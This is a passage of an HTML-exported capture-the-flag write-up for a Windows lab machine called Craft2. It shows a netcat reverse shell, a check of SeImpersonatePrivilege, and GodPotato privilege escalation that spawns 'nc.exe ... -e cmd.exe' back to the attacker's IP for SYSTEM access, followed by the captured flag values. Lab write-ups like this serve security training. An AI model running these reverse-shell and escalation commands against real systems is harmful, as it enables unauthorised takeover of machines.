+<p>And we should obtain a shell as the user <code class="inline-code">thecybergeek</code> which has <code class="inline-code">SeImpersonatePrivilege</code> set:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.145.188] 49774
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+C:\Windows\system32&gt;
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.145.188] 49774
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+<span class="hljs-section">PRIVILEGES INFORMATION
+----------------------</span>
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+C:\Windows\system32&gt;
+</code></pre></div>
+<p>Stand up another listener on port 445. Transfer <code class="inline-code">GodPotato.exe</code> and obtain a SYSTEM level shell:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">PS C:\Temp&gt; .\GodPotato.exe -cmd &quot;C:\Temp\nc.exe 192.168.45.197 445 -e cmd.exe&quot;
+.\GodPotato.exe -cmd &quot;C:\Temp\nc.exe 192.168.45.197 445 -e cmd.exe&quot;
+[*] CombaseModule: 0x140707836985344
+[*] DispatchTable: 0x140707839298752
+[*] UseProtseqFunction: 0x140707838675536
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\1d73effd-aba2-4e4c-9646-79273eba9b1e\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00002002-109c-ffff-bec7-96fcfec1ebba
+[*] DCOM obj OXID: 0xcb9855e8d577fd8c
+[*] DCOM obj OID: 0x47140a816dc037c0
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 872 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2100</pre><pre class="hljs"><code>PS C:\Temp&gt; .\GodPotato.exe -cmd &quot;C:\Temp\nc.exe 192.168.45.197 445 -e cmd.exe&quot;
+.\GodPotato.exe -cmd &quot;C:\Temp\nc.exe 192.168.45.197 445 -e cmd.exe&quot;
+[*] CombaseModule: 0x140707836985344
+[*] DispatchTable: 0x140707839298752
+[*] UseProtseqFunction: 0x140707838675536
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\1d73effd-aba2-4e4c-9646-79273eba9b1e\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00002002-109c-ffff-bec7-96fcfec1ebba
+[*] DCOM obj OXID: 0xcb9855e8d577fd8c
+[*] DCOM obj OID: 0x47140a816dc037c0
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 872 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2100</code></pre></div>
+<p>The <code class="inline-code">proof.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nc -lvnp 445                    
+listening on [any] 445 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.145.188] 49779
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+
+C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\proof.txt
+more C:\Users\Administrator\Desktop\proof.txt
+8df3b63d9a99b2bdac6a0e852b2e8ef7
+
+C:\Windows\system32&gt;
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Craft2]</span>
+&boxur;&boxh;$ nc -lvnp <span class="hljs-number">445</span>                    
+listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">445</span> ...
+connect to <span class="hljs-selector-attr">[192.168.45.197]</span> from (UNKNOWN) <span class="hljs-selector-attr">[192.168.145.188]</span> <span class="hljs-number">49779</span>
+Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.17763.2746]</span>
+(c) <span class="hljs-number">2018</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+
+C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\proof.txt
+more C:\Users\Administrator\Desktop\proof.txt
+<span class="hljs-number">8</span>df3b63d9a99b2bdac6a0e852b2e8ef7
+
+C:\Windows\system32&gt;
+</code></pre></div>
+<p>The <code class="inline-code">local.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Users&gt;cd apache
+cd apache
+
+C:\Users\apache&gt;tree /a /f
+tree /a /f
+Folder PATH listing
+Volume serial number is 5C30-DCD7
+C:.
++---Desktop
+|       local.txt
+|       
++---Documents
++---Downloads
++---Favorites
++---Links
++---Music
++---Pictures
++---Saved Games
+\---Videos
+
+C:\Users\apache&gt;cd Desktop
+cd Desktop
+
+C:\Users\apache\Desktop&gt;more local.txt
+more local.txt
+caf05b2fe593ade137fcec383ecfac68
+
+C:\Users\apache\Desktop&gt;
+</pre><pre class="hljs"><code>C:\Users&gt;<span class="hljs-keyword">cd</span> apache
+<span class="hljs-keyword">cd</span> apache
+
+C:\Users\apache&gt;tree <span class="hljs-string">/a</span> <span class="hljs-string">/f</span>
+tree <span class="hljs-string">/a</span> <span class="hljs-string">/f</span>
+Folder PATH listing
+Volume serial number is 5C30-DCD7
+C<span class="hljs-function">:.</span>
++<span class="hljs-params">---Desktop</span>
+|       local.txt
+|       
++<span class="hljs-params">---Documents</span>
++<span class="hljs-params">---Downloads</span>
++<span class="hljs-params">---Favorites</span>
++<span class="hljs-params">---Links</span>
++<span class="hljs-params">---Music</span>
++<span class="hljs-params">---Pictures</span>
++<span class="hljs-params">---Saved</span> Games
+\<span class="hljs-params">---Videos</span>
+
+C:\Users\apache&gt;<span class="hljs-keyword">cd</span> Desktop
+<span class="hljs-keyword">cd</span> Desktop
+
+C:\Users\apache\Desktop&gt;more local.txt
+more local.txt
+caf05b2fe593ade137fcec383ecfac68
+
+C:\Users\apache\Desktop&gt;
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
